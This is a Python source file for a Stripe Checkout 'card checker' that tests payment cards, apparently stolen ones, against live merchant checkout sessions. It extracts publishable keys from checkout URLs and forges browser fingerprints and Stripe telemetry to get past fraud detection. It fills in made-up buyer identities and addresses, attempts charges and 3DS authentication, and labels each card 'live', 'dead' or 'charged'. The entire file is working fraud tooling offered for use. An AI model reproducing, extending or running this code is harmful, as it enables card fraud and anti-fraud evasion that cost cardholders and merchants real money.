# Crafted With <3 By Bhaskar
import random
import re
import json
import base64
import uuid
import hashlib
import asyncio
import time as _time
from urllib.parse import unquote, quote as url_quote
from curl_cffi.requests import AsyncSession

_TLS_PROFILES = [
    "chrome131", "chrome124", "chrome123", "chrome120",
    "chrome119", "chrome116", "chrome110", "chrome107",
]
BROWSER_PROFILES = _TLS_PROFILES

# ── Decline Code → Friendly Message + Status Mapping ──
DECLINE_MAP = {
    "incorrect_cvc":        ("Incorrect CVC",               "live"),
    "invalid_cvc":          ("Invalid CVC",                 "live"),
    "insufficient_funds":   ("Insufficient Funds",          "live"),
    "authentication_required": ("3DS Authentication Required", "live"),
    "card_error_authentication_required": ("3DS Required",  "live"),
    "transaction_not_allowed": ("Transaction Not Allowed",  "live"),
    "do_not_honor":         ("Do Not Honor",                "live"),
    "try_again_later":      ("Try Again Later",             "live"),
    "approve_with_id":      ("Approve With ID",             "live"),
    "issuer_not_available": ("Issuer Not Available",        "live"),
    "reenter_transaction":  ("Re-enter Transaction",        "live"),
    "no_action_taken":      ("No Action Taken",             "live"),
    "revocation_of_all":    ("Revocation Of All",           "live"),
    "security_violation":   ("Security Violation",          "live"),

    "generic_decline":      ("Generic Decline",             "dead"),
    "card_declined":        ("Card Declined",               "dead"),
    "fraudulent":           ("Fraudulent",                  "dead"),
    "lost_card":            ("Lost Card",                   "dead"),
    "stolen_card":          ("Stolen Card",                 "dead"),
    "expired_card":         ("Expired Card",                "dead"),
    "card_not_supported":   ("Card Not Supported",          "dead"),
    "currency_not_supported": ("Currency Not Supported",    "dead"),
    "incorrect_number":     ("Incorrect Card Number",       "dead"),
    "invalid_number":       ("Invalid Card Number",         "dead"),
    "invalid_expiry_month": ("Invalid Expiry Month",        "dead"),
    "invalid_expiry_year":  ("Invalid Expiry Year",         "dead"),
    "invalid_account":      ("Invalid Account",             "dead"),
    "pickup_card":          ("Pickup Card",                 "dead"),
    "restricted_card":      ("Restricted Card",             "dead"),
    "card_velocity_exceeded": ("Card Velocity Exceeded",    "dead"),
    "testmode_charges_only": ("Test Mode Key",              "dead"),
    "api_key_expired":      ("API Key Expired",             "dead"),
    "processing_error":     ("Processing Error",            "dead"),
    "service_not_allowed":  ("Service Not Allowed",         "dead"),
    "card_decline_rate_limit_exceeded": ("Rate Limited",    "dead"),
    "merchant_blacklist":   ("Merchant Blacklist",          "dead"),
    "new_account_information_available": ("New Account Info Available", "dead"),
    "withdrawal_count_limit_exceeded": ("Withdrawal Limit Exceeded", "dead"),

    "challenge_required":   ("3DS Challenge Required",      "3ds"),
}


def _classify_decline(decline_code: str, error_code: str, message: str) -> tuple:
    for code in (decline_code, error_code):
        if code and code in DECLINE_MAP:
            return DECLINE_MAP[code]
    msg_lower = message.lower() if message else ""
    for code, (label, status) in DECLINE_MAP.items():
        if code in msg_lower:
            return label, status
    clean = message.replace("_", " ").strip() if message else "Payment Failed"
    return clean, "dead"


def _classify_and_return(dcode, code, msg, extra_fn):
    clean_msg, stype = _classify_decline(dcode, code, msg)
    dc_label = dcode or code or ""
    if stype == "live":
        return "Approved! ✅ -» live", clean_msg, extra_fn(decline_code=dc_label, stripe_msg=msg)
    elif stype == "3ds":
        return "3DS 🔐", clean_msg, extra_fn(decline_code=dc_label, stripe_msg=msg)
    return "Dead! ❌", clean_msg, extra_fn(decline_code=dc_label, stripe_msg=msg)


def parse_checkout_url(url: str) -> tuple:
    """
    Parse a Stripe Checkout URL and extract cs_live and pk_live.
    Returns (cs_live, pk_live) or raises ValueError.
    """
    cs_match = re.search(r'(cs_(?:live|test)_[A-Za-z0-9]+)', url)
    if not cs_match:
        raise ValueError("Could not find cs_live/cs_test in URL")
    cs_live = cs_match.group(1)

    pk_live = None
    if '#' in url:
        hash_frag = url.split('#', 1)[1]
        hash_decoded = unquote(hash_frag)
        try:
            padded = hash_decoded + '=' * (4 - len(hash_decoded) % 4)
            b64_bytes = base64.b64decode(padded)
            xor_decoded = ''.join(chr(b ^ 5) for b in b64_bytes)
            data = json.loads(xor_decoded)
            pk_live = data.get('apiKey')
        except Exception:
            pass

    if not pk_live:
        raise ValueError("Could not extract pk_live from checkout URL hash")

    return cs_live, pk_live


# ── Stripe JS version / telemetry constants ──
STRIPE_JS_VERSIONS = [
    "3.80.0", "3.79.0", "3.78.0", "3.77.0", "3.76.0",
    "3.75.0", "3.74.0", "3.73.0", "3.72.0", "3.71.0",
]
_STRIPE_URL_SALT = "7766e861-8279-424d-87a1-07a6022fd8cd"
_STRIPE_TELEMETRY_TAGS = ["4.5.43", "4.5.42", "4.5.41", "4.5.40", "4.5.39"]


def _sha256_url_hash(text: str) -> str:
    if not text:
        return text
    digest = hashlib.sha256((text + _STRIPE_URL_SALT).encode("utf-8")).digest()
    return base64.b64encode(digest).decode().replace("+", "-").replace("/", "_").rstrip("=")


def _random_hex(length: int) -> str:
    return "".join(random.choice("abcdef0123456789") for _ in range(length))


def _random_stripe_ua_tag() -> str:
    h = _random_hex(10)
    return f"stripe.js/{h}; stripe-js-v3/{h}; checkout"


# ── Browser / User-Agent generation ──
_CHROME_BUILDS = {
    131: (6778, 69, 265),  124: (6367, 60, 170),  123: (6312, 46, 165),
    120: (6099, 62, 200),  119: (6045, 105, 210), 116: (5845, 96, 200),
    110: (5481, 77, 180),  107: (5304, 62, 150),
}
_WIN_PLATFORMS = [
    "Windows NT 10.0; Win64; x64",
    "Windows NT 10.0; Win64; x64",
    "Windows NT 10.0; Win64; x64",
]
_MAC_PLATFORMS = [
    "Macintosh; Intel Mac OS X 10_15_7",
    "Macintosh; Intel Mac OS X 14_0",
    "Macintosh; Intel Mac OS X 14_4_1",
    "Macintosh; Intel Mac OS X 14_7_1",
    "Macintosh; Intel Mac OS X 15_0",
    "Macintosh; Intel Mac OS X 15_2",
    "Macintosh; Intel Mac OS X 13_6_7",
    "Macintosh; Intel Mac OS X 13_4",
]
_LINUX_PLATFORMS = [
    "X11; Linux x86_64",
    "X11; Ubuntu; Linux x86_64",
]


def _chrome_version_string(major: int) -> str:
    base_build, patch_min, patch_max = _CHROME_BUILDS.get(major, (6778, 50, 200))
    return f"{major}.0.{base_build}.{random.randint(patch_min, patch_max)}"


def _generate_browser() -> tuple:
    major = random.choice(list(_CHROME_BUILDS.keys()))
    ver = _chrome_version_string(major)
    platform = random.choice(_WIN_PLATFORMS + _MAC_PLATFORMS + _LINUX_PLATFORMS)
    ua = f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver} Safari/537.36"
    nab_v = str(8 + (major % 17))
    sec_ch_ua = f'"Chromium";v="{major}", "Google Chrome";v="{major}", "Not_A Brand";v="{nab_v}"'
    if "Macintosh" in platform:
        ch_plat = '"macOS"'
    elif "Linux" in platform:
        ch_plat = '"Linux"'
    else:
        ch_plat = '"Windows"'
    return ua, f"chrome{major}", sec_ch_ua, ch_plat


def _generate_user_agent() -> str:
    ua, *_ = _generate_browser()
    return ua


def _parse_ua_for_stripe(ua: str) -> dict:
    if "Macintosh" in ua:
        os_name, m = "Mac OS", re.search(r'Mac OS X ([\d_.]+)', ua)
        os_version = m.group(1).replace("_", ".") if m else "10.15.7"
    elif "Linux" in ua:
        os_name, os_version = "Linux", ""
    else:
        os_name, os_version = "Windows", "10"
    m = re.search(r'Chrome/([\d.]+)', ua)
    browser_version = m.group(1) if m else "131.0.0.0"
    return {"os_name": os_name, "os_version": os_version, "browser_name": "Chrome", "browser_version": browser_version}


# ── XOR / checksum helpers ──
def _xor_encode(plaintext: str) -> bytes:
    return bytes(ord(ch) ^ 5 for ch in plaintext)


def _encode_base64_custom(data: bytes) -> str:
    return base64.b64encode(data).decode()


def _get_js_encoded_string(pm_id: str) -> str:
    return _encode_base64_custom(_xor_encode('{"id":"' + pm_id + '"}'))


# ── m.stripe.com fingerprint ──
def _build_m_stripe_payload(ua: str, checkout_url: str) -> dict:
    url_hash = _sha256_url_hash(checkout_url)
    full_hashed_url = f"https://checkout.stripe.com/{url_hash}"
    screens = [("1920", "1080"), ("1536", "864"), ("2560", "1440"), ("1440", "900")]
    sw, sh = random.choice(screens)
    timestamp = str(int(random.uniform(1700000000, 1740000000) * 1000))
    return {
        "v2": 1, "id": _random_hex(32), "t": random.randint(150, 500),
        "tag": random.choice(_STRIPE_TELEMETRY_TAGS), "src": "js",
        "a": {
            "a": {"v": "true", "t": 0}, "b": {"v": "false", "t": 0},
            "c": {"v": "en-US", "t": 0}, "d": {"v": "Win32", "t": 0},
            "e": {"v": "Browser PDF plug-in,internal-pdf-viewer,application/pdf,pdf", "t": random.randint(10, 30)},
            "f": {"v": f"{sw}w_{sh}h_{random.choice(['24', '30'])}d_1r", "t": 0},
            "g": {"v": "1", "t": 0}, "h": {"v": "false", "t": 0},
            "i": {"v": "sessionStorage-enabled, localStorage-enabled", "t": random.randint(1, 5)},
            "j": {"v": "".join(random.choice("01") for _ in range(55)), "t": random.randint(60, 120)},
            "k": {"v": "", "t": 0}, "l": {"v": ua, "t": 0}, "m": {"v": "", "t": 0},
            "n": {"v": "false", "t": random.randint(60, 120), "at": 1},
            "o": {"v": _random_hex(32), "t": random.randint(60, 120)},
        },
        "b": {
            "a": full_hashed_url, "b": full_hashed_url,
            "c": _sha256_url_hash("checkout.stripe.com"),
            "d": "NA", "e": "NA", "f": False, "g": True, "h": True,
            "i": ["location"], "j": [], "n": random.randint(200, 400),
            "u": "checkout.stripe.com", "v": "checkout.stripe.com",
            "w": f"{timestamp}:{_sha256_url_hash(timestamp)}",
        },
        "h": _random_hex(20),
    }


async def _get_stripe_fingerprint(client: AsyncSession, ua: str, cs_live: str) -> dict:
    try:
        checkout_url = f"https://checkout.stripe.com/c/pay/{cs_live}"
        payload = _build_m_stripe_payload(ua, checkout_url)
        encoded = base64.b64encode(url_quote(json.dumps(payload), safe="").encode()).decode()
        r = await client.post(
            "https://m.stripe.com/6", content=encoded,
            headers={"user-agent": ua, "content-type": "text/plain;charset=UTF-8",
                     "origin": "https://checkout.stripe.com", "referer": "https://checkout.stripe.com/"},
            timeout=8,
        )
        data = r.json()
        muid, guid, sid = data.get("muid", ""), data.get("guid", ""), data.get("sid", "")
        if muid and sid:
            return {"guid": guid, "muid": muid, "sid": sid,
                    "time_on_page": str(random.randint(15000, 90000)), "pasted_fields": "number"}
    except Exception:
        pass
    return {"guid": str(uuid.uuid4()), "muid": str(uuid.uuid4()), "sid": str(uuid.uuid4()),
            "time_on_page": str(random.randint(15000, 90000)), "pasted_fields": "number"}


# ── Random identity data ──
ADDRESSES = [
    {"street": "3501 S Main St", "city": "Gainesville", "state": "FL", "zip": "32601"},
    {"street": "3501 Main St", "city": "Frederica", "state": "DE", "zip": "19946"},
    {"street": "311 Otter Way", "city": "Frederica", "state": "DE", "zip": "19946"},
    {"street": "1 Saint Agnes St", "city": "Frederica", "state": "DE", "zip": "19946"},
    {"street": "205 Kestrel Ct #205", "city": "Frederica", "state": "DE", "zip": "19946"},
    {"street": "5035 93rd Ave", "city": "Pinellas Park", "state": "FL", "zip": "33782"},
    {"street": "809 Bremen Ave", "city": "Perdido Key", "state": "FL", "zip": "32507"},
    {"street": "635 Orange Ct", "city": "Rockledge", "state": "FL", "zip": "32955"},
    {"street": "4107 78th St W", "city": "Bradenton", "state": "FL", "zip": "34209"},
    {"street": "190 SW 3rd Ct", "city": "Florida City", "state": "FL", "zip": "33034"},
    {"street": "13030 Silver Bay Ct", "city": "Fort Myers", "state": "FL", "zip": "33913"},
]
FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph",
    "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth",
    "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Daniel", "Matthew",
    "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Joshua", "Kenneth",
    "Alex", "Chris", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Quinn",
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Wilson", "Anderson", "Taylor", "Thomas", "Moore",
    "Jackson", "Martin", "Lee", "Thompson", "White", "Harris", "Clark",
]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
PHONE_PREFIXES = ["212", "310", "415", "305", "713", "312", "404", "206", "602", "303"]


def _random_email() -> str:
    return f"{random.choice(FIRST_NAMES).lower()}{random.randint(10, 9999)}@{random.choice(EMAIL_DOMAINS)}"


def _random_phone() -> str:
    return f"+1{random.choice(PHONE_PREFIXES)}{random.randint(100, 999)}{random.randint(1000, 9999)}"


# ── Merchant info retrieval (used by single.py for display before hitting) ──
async def retrieve_merchant_info(cs_live: str, pk_live: str, proxy: str = None) -> dict:
    info = {"merchant": "N/A", "product": "N/A", "price": "N/A",
            "currency": "usd", "amount_raw": 0, "status_url": "N/A",
            "error": None, "_raw_init_data": None}

    async def _do_init(px):
        proxy_dict = {"http": px, "https": px} if px else None
        ua = _generate_user_agent()
        async with AsyncSession(impersonate=random.choice(BROWSER_PROFILES),
                                proxies=proxy_dict, timeout=20, verify=False) as cl:
            r = await cl.post(
                f"https://api.stripe.com/v1/payment_pages/{cs_live}/init",
                data={"key": pk_live, "eid": "NA", "browser_locale": "en-US", "redirect_type": "url"},
                headers={"accept": "application/json", "content-type": "application/x-www-form-urlencoded",
                         "user-agent": ua, "origin": "https://checkout.stripe.com",
                         "referer": "https://checkout.stripe.com/"},
            )
            return r.json()

    for px in ([proxy, None] if proxy else [None]):
        try:
            j = await _do_init(px)
            if "error" in j:
                info["error"] = j["error"].get("message", "Unknown error")
                return info
            info["merchant"] = j.get("account_settings", {}).get("display_name", "N/A")
            info["currency"] = j.get("currency", "usd")
            inv = j.get("invoice") or {}
            lig = j.get("line_item_group") or {}
            prod = j.get("product") or {}
            inv_lines = (inv.get("lines") or {}).get("data") or []
            li_items = lig.get("line_items") or []
            if inv_lines:
                info["product"] = ((inv_lines[0].get("price") or {}).get("product") or {}).get("name", "N/A")
            elif li_items:
                info["product"] = li_items[0].get("name", "N/A")
            elif prod.get("name"):
                info["product"] = prod["name"]
            amount = j.get("amount_total") or lig.get("total") or inv.get("total") or 0
            if not amount and li_items:
                amount = li_items[0].get("total", 0)
            info["amount_raw"] = amount
            info["price"] = f"{info['currency'].upper()} {int(amount) / 100}"
            info["status_url"] = j.get("success_url", "N/A")
            info["_raw_init_data"] = j
            info["error"] = None
            return info
        except Exception as e:
            info["error"] = str(e)[:100]
    return info


# ═══════════════════════════════════════════════════════════
#  STRIPE GATE — Main checkout session hitter
# ═══════════════════════════════════════════════════════════

async def _session_update(client, cs_live, pk_live, data: dict, headers: dict) -> dict | None:
    """Fire a single /update call. Returns parsed JSON on success, None on failure."""
    try:
        r = await client.post(
            f"https://api.stripe.com/v1/payment_pages/{cs_live}/update",
            data={"eid": "NA", "key": pk_live, **data},
            headers=headers,
        )
        if r.status_code in (200, 201):
            return r.json()
    except Exception:
        pass
    return None


async def stripe_gate(
    cc: str, month: str, year: str, cvv: str,
    cs_live: str, pk_live: str,
    proxy: str = None, custom_addresses: list = None,
) -> tuple:
    """
    Stripe Checkout session hitter.
    Returns (status, msg, extra_info_dict).
    """
    fname = random.choice(FIRST_NAMES)
    lname = random.choice(LAST_NAMES)
    fullname = f"{fname} {lname}"
    email = _random_email()
    phone = _random_phone()
    addr = random.choice(custom_addresses or ADDRESSES)
    country = addr.get("country", "US")
    ua, impersonate, sec_ch_ua, sec_ch_platform = _generate_browser()
    stripe_tag = _random_stripe_ua_tag()
    version = random.choice(STRIPE_JS_VERSIONS)

    browser_tz = random.choice(["-300", "-360", "-420", "-480", "-240"])
    browser_color_depth = random.choice(["24", "30", "32"])
    browser_screen_h = random.choice(["864", "1080", "1440"])
    browser_screen_w = random.choice(["1536", "1920", "2560"])

    coname, items, amount, amttt, currency, surl = "Unknown Merchant", "Unknown Product", 0, 0, "usd", "N/A"
    extra = lambda **kw: {"merchant": coname, "price": f"{currency.upper()} {amttt}", "product": items, "receipt": surl, **kw}

    _sec = {
        "sec-ch-ua": sec_ch_ua, "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": sec_ch_platform, "accept-language": "en-US,en;q=0.9",
    }
    _checkout_hdrs = {
        "accept": "application/json", "content-type": "application/x-www-form-urlencoded",
        "user-agent": ua, "origin": "https://checkout.stripe.com",
        "referer": f"https://checkout.stripe.com/c/pay/{cs_live}",
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site", **_sec,
    }
    _js_hdrs = lambda: {
        "accept": "application/json", "content-type": "application/x-www-form-urlencoded",
        "user-agent": ua, "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/",
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site", **_sec,
    }

    proxy_dict = {"http": proxy, "https": proxy} if proxy else None

    async with AsyncSession(impersonate=impersonate, proxies=proxy_dict,
                            timeout=15, verify=False, headers={"user-agent": ua}) as client:

        # ── Step 0: Visit checkout page ──
        _page_start = _time.monotonic()
        try:
            await client.get(
                f"https://checkout.stripe.com/c/pay/{cs_live}",
                headers={"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "user-agent": ua, "upgrade-insecure-requests": "1",
                         "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
                         "sec-fetch-site": "none", "sec-fetch-user": "?1", **_sec},
                timeout=12,
            )
        except Exception:
            pass
        await asyncio.sleep(random.uniform(1.0, 2.5))

        # ── Step 0b: Stripe fingerprint ──
        fp = await _get_stripe_fingerprint(client, ua, cs_live)
        client.cookies.set("__stripe_mid", fp["muid"], domain=".stripe.com")
        client.cookies.set("__stripe_sid", fp["sid"], domain=".stripe.com")
        await asyncio.sleep(random.uniform(0.3, 0.7))

        # ── Step 1: Init session ──
        try:
            r1 = await client.post(
                f"https://api.stripe.com/v1/payment_pages/{cs_live}/init",
                data={"key": pk_live, "eid": "NA", "browser_locale": "en-US", "redirect_type": "url"},
                headers=_checkout_hdrs,
            )
            j1 = r1.json()
        except Exception as exc:
            return "Dead! ❌", f"Init failed: {str(exc)[:80]}", extra()

        if "error" in j1:
            return "Dead! ❌", f"[ Payment Failed ] » [{j1['error'].get('code', '')} » {j1['error'].get('message', '')}]", extra()

        # Parse session info
        init_checksum = j1.get("init_checksum", "")
        coname = j1.get("account_settings", {}).get("display_name", coname)
        currency = j1.get("currency", currency)
        _mode = j1.get("mode", "payment")

        inv = j1.get("invoice") or {}
        lig = j1.get("line_item_group") or {}
        prod_obj = j1.get("product") or {}
        inv_lines = (inv.get("lines") or {}).get("data") or []
        li_items = lig.get("line_items") or []
        if inv_lines:
            items = ((inv_lines[0].get("price") or {}).get("product") or {}).get("name", items)
        elif li_items:
            items = li_items[0].get("name", items)
        elif prod_obj.get("name"):
            items = prod_obj["name"]

        amount = j1.get("amount_total") or lig.get("total") or inv.get("total") or 0
        if not amount and li_items:
            amount = li_items[0].get("total", 0)
        amttt = int(amount) / 100
        surl = j1.get("success_url", surl)

        # Detect required fields
        _needs_email = not (j1.get("customer_email") or "")
        _needs_phone = (j1.get("phone_number_collection") or {}).get("enabled", False)
        _needs_billing = j1.get("billing_address_collection") == "required"
        _needs_shipping = bool((j1.get("shipping_address_collection") or {}).get("allowed_countries"))
        _needs_tos = (j1.get("consent_collection") or {}).get("terms_of_service") == "required"

        await asyncio.sleep(random.uniform(0.5, 1.0))

        # ── Step 2: Create PaymentMethod ──
        _ua_info = _parse_ua_for_stripe(ua)
        stripe_ua_json = json.dumps({
            "os": {"name": _ua_info["os_name"], "version": _ua_info["os_version"]},
            "browser": {"name": _ua_info["browser_name"], "version": _ua_info["browser_version"]},
            "device": {}, "bindings_version": f"stripe.js/{version}", "lang": "js",
        })

        _elapsed = int((_time.monotonic() - _page_start) * 1000)
        fp["time_on_page"] = str(max(_elapsed, random.randint(8000, 25000)))
        fp["pasted_fields"] = random.choice(["number", "number|cvc", ""])

        pm_data = {
            "type": "card",
            "card[number]": cc, "card[cvc]": cvv,
            "card[exp_month]": month, "card[exp_year]": year,
            "allow_redisplay": "unspecified",
            "billing_details[name]": fullname,
            "billing_details[email]": email,
            "billing_details[address][country]": country,
            "billing_details[address][line1]": addr["street"],
            "billing_details[address][city]": addr["city"],
            "billing_details[address][postal_code]": addr["zip"],
            "key": pk_live,
            "payment_user_agent": stripe_tag,
            "referrer": f"https://checkout.stripe.com/c/pay/{cs_live}",
            "_stripe_version": "2024-06-20",
            "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_subtype]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            **fp,
        }
        if addr.get("state"):
            pm_data["billing_details[address][state]"] = addr["state"]
        if _needs_phone:
            pm_data["billing_details[phone]"] = phone

        pm_hdrs = {**_js_hdrs(), "x-stripe-user-agent": stripe_ua_json}

        try:
            r2 = await client.post("https://api.stripe.com/v1/payment_methods", data=pm_data, headers=pm_hdrs)
            j2 = r2.json()
        except Exception:
            return "Dead! ❌", "Payment method creation failed", extra()

        newpm = j2.get("id")
        if not newpm:
            err = j2.get("error") or {}
            msg = err.get("message", "")
            if "integration surface" in msg.lower() or "tokenization" in msg.lower():
                return "Dead! ❌", "Merchant blocks raw card tokenization", extra(stripe_msg=msg)
            if msg:
                return _classify_and_return(err.get("decline_code", ""), err.get("code", ""), msg, extra)
            return "Dead! ❌", "Payment method creation failed", extra()

        await asyncio.sleep(random.uniform(0.3, 0.6))

        # ── Step 3: Submit session details via /update (sequential, one concern per call) ──
        # 3a) Email — always submit (even if merchant pre-set, Stripe may still need it)
        upd_res = await _session_update(client, cs_live, pk_live, {"email": email}, _checkout_hdrs)
        if upd_res:
            init_checksum = upd_res.get("init_checksum", init_checksum)

        # 3b) Phone number
        if _needs_phone:
            await asyncio.sleep(random.uniform(0.2, 0.5))
            upd_res = await _session_update(client, cs_live, pk_live, {"phone_number": phone}, _checkout_hdrs)
            if upd_res:
                init_checksum = upd_res.get("init_checksum", init_checksum)

        # 3c) Billing address — only when explicitly required; omit empty fields
        if _needs_billing:
            await asyncio.sleep(random.uniform(0.2, 0.5))
            bill = {
                "billing_address[name]": fullname,
                "billing_address[line1]": addr["street"],
                "billing_address[city]": addr["city"],
                "billing_address[postal_code]": addr["zip"],
                "billing_address[country]": country,
            }
            if addr.get("state"):
                bill["billing_address[state]"] = addr["state"]
            upd_res = await _session_update(client, cs_live, pk_live, bill, _checkout_hdrs)
            if upd_res:
                init_checksum = upd_res.get("init_checksum", init_checksum)

        # 3d) Shipping address
        if _needs_shipping:
            await asyncio.sleep(random.uniform(0.2, 0.5))
            ship = {
                "shipping_address[name]": fullname,
                "shipping_address[address][line1]": addr["street"],
                "shipping_address[address][city]": addr["city"],
                "shipping_address[address][postal_code]": addr["zip"],
                "shipping_address[address][country]": country,
            }
            if addr.get("state"):
                ship["shipping_address[address][state]"] = addr["state"]
            upd_res = await _session_update(client, cs_live, pk_live, ship, _checkout_hdrs)
            if upd_res:
                init_checksum = upd_res.get("init_checksum", init_checksum)

        await asyncio.sleep(random.uniform(0.4, 0.8))

        # ── Step 4: Confirm payment ──
        confirm_data = {
            "eid": "NA",
            "payment_method": newpm,
            "expected_amount": str(amount),
            "expected_payment_method_type": "card",
            "key": pk_live,
            "js_checksum": _get_js_encoded_string(newpm),
            "email": email,
        }
        if init_checksum:
            confirm_data["init_checksum"] = init_checksum
        if _needs_tos:
            confirm_data["consent[terms_of_service]"] = "accepted"
        if _needs_phone:
            confirm_data["phone_number"] = phone

        try:
            r3 = await client.post(
                f"https://api.stripe.com/v1/payment_pages/{cs_live}/confirm",
                data=confirm_data, headers=_checkout_hdrs,
            )
            j3 = r3.json()
            r3_text = r3.text
        except Exception:
            return "Dead! ❌", "Confirm request failed", extra()

        surl = j3.get("success_url", surl)

        if j3.get("status") == "succeeded":
            return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")

        # ── Handle confirm errors ──
        if (j3.get("error") or {}).get("message"):
            err = j3["error"]
            dcode, code, msg = err.get("decline_code", ""), err.get("code", ""), err.get("message", "")

            # Session integrity error — retry with ALL details embedded in confirm
            if "error has occurred confirming" in msg.lower():
                confirm_data["billing_address[name]"] = fullname
                confirm_data["billing_address[line1]"] = addr["street"]
                confirm_data["billing_address[city]"] = addr["city"]
                confirm_data["billing_address[postal_code]"] = addr["zip"]
                confirm_data["billing_address[country]"] = country
                if addr.get("state"):
                    confirm_data["billing_address[state]"] = addr["state"]
                if _needs_shipping:
                    confirm_data["shipping_address[name]"] = fullname
                    confirm_data["shipping_address[address][line1]"] = addr["street"]
                    confirm_data["shipping_address[address][city]"] = addr["city"]
                    confirm_data["shipping_address[address][postal_code]"] = addr["zip"]
                    confirm_data["shipping_address[address][country]"] = country
                    if addr.get("state"):
                        confirm_data["shipping_address[address][state]"] = addr["state"]
                try:
                    await asyncio.sleep(random.uniform(0.4, 0.8))
                    r3 = await client.post(
                        f"https://api.stripe.com/v1/payment_pages/{cs_live}/confirm",
                        data=confirm_data, headers=_checkout_hdrs,
                    )
                    j3 = r3.json()
                    r3_text = r3.text
                    surl = j3.get("success_url", surl)
                    if j3.get("status") == "succeeded":
                        return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")
                    err2 = j3.get("error") or {}
                    if err2.get("decline_code") or err2.get("code"):
                        return _classify_and_return(err2.get("decline_code", ""), err2.get("code", ""), err2.get("message", ""), extra)
                except Exception:
                    pass

                return "Dead! ❌", f"Checkout Session Error [mode={_mode}]", extra(decline_code="session_error", stripe_msg=msg)

            return _classify_and_return(dcode, code, msg, extra)

        if '"verification_url": "' in r3_text:
            return "Dead! ❌", "HCAPTCHA Not Bypassed", extra()

        # ── Step 5: 3DS handling ──
        pi_obj = j3.get("payment_intent") or {}
        pi_status = pi_obj.get("status")
        if pi_status == "succeeded":
            return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")

        next_action = pi_obj.get("next_action") or {}
        next_type = next_action.get("type", "")
        use_sdk = next_action.get("use_stripe_sdk") or {}
        payatt = use_sdk.get("three_d_secure_2_source")
        servertrans = use_sdk.get("server_transaction_id")
        secret = pi_obj.get("client_secret")
        pi = pi_obj.get("id")

        if next_type == "redirect_to_url" or next_action.get("redirect_to_url"):
            rurl = (next_action.get("redirect_to_url") or {}).get("url", "")
            return "3DS 🔐", "3DS Redirect Required", extra(
                decline_code="3ds_redirect", stripe_msg=f"3DS redirect: {rurl[:80]}" if rurl else "3DS Redirect Required")

        if not pi:
            err = j3.get("error") or {}
            return _classify_and_return(err.get("decline_code", ""), err.get("code", ""), err.get("message", "Payment Failed"), extra)

        if not payatt:
            err = j3.get("error") or {}
            dcode, code, msg = err.get("decline_code", ""), err.get("code", ""), err.get("message", "Payment Failed")
            clean_msg, stype = _classify_decline(dcode, code, msg)
            if stype == "live":
                return "Approved! ✅ -» live", clean_msg, extra(decline_code=dcode or code, stripe_msg=msg)
            if next_action and next_type:
                return "3DS 🔐", f"3DS Required ({next_type})", extra(
                    decline_code="3ds_unknown", stripe_msg=f"next_action type: {next_type}")
            return "Dead! ❌", clean_msg, extra(decline_code=dcode or code, stripe_msg=msg)

        if not servertrans:
            return "3DS 🔐", "3DS Required (no server transaction)", extra(
                decline_code="3ds_no_trans_id", stripe_msg="server_transaction_id missing")

        # ── 3DS authenticate ──
        enc_server = base64.b64encode(f'{{"threeDSServerTransID":"{servertrans}"}}'.encode()).decode()
        auth_data = {
            "source": payatt, "key": pk_live,
            "browser": json.dumps({
                "fingerprintAttempted": True, "fingerprintData": enc_server,
                "challengeWindowSize": None, "threeDSCompInd": "Y",
                "browserJavaEnabled": False, "browserJavascriptEnabled": True,
                "browserLanguage": "", "browserColorDepth": browser_color_depth,
                "browserScreenHeight": browser_screen_h, "browserScreenWidth": browser_screen_w,
                "browserTZ": browser_tz, "browserUserAgent": ua,
            }),
            "one_click_authn_device_support[hosted]": "false",
            "one_click_authn_device_support[same_origin_frame]": "false",
            "one_click_authn_device_support[spc_eligible]": "true",
            "one_click_authn_device_support[webauthn_eligible]": "true",
            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
        }
        try:
            r4 = await client.post("https://api.stripe.com/v1/3ds2/authenticate", data=auth_data, headers=_js_hdrs())
            j4 = r4.json()
        except Exception:
            j4 = {}

        if j4.get("state") == "challenge_required":
            return "3DS 🔐", "3DS Challenge Required", extra(decline_code="challenge_required", stripe_msg="3DS Challenge Required")

        # ── Final status check ──
        try:
            r5 = await client.get(
                f"https://api.stripe.com/v1/payment_intents/{pi}",
                params={"key": pk_live, "is_stripe_sdk": "false", "client_secret": secret},
                headers=_js_hdrs(),
            )
            j5 = r5.json()
            r5_text = r5.text
        except Exception:
            return "Dead! ❌", "Final status check failed", extra()

        if j5.get("status") == "succeeded":
            return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")
        if "verify_challenge" in r5_text:
            return "Dead! ❌", "HCAPTCHA Not Bypassed", extra()
        if "authentication_challenge" in r5_text:
            return "Dead! ❌", "OTP Required", extra()

        final_err = j5.get("last_payment_error") or {}
        msg = final_err.get("message") or (j5.get("error") or {}).get("message", "") or "Payment Failed"
        return _classify_and_return(final_err.get("decline_code", ""), final_err.get("code", ""), msg, extra)
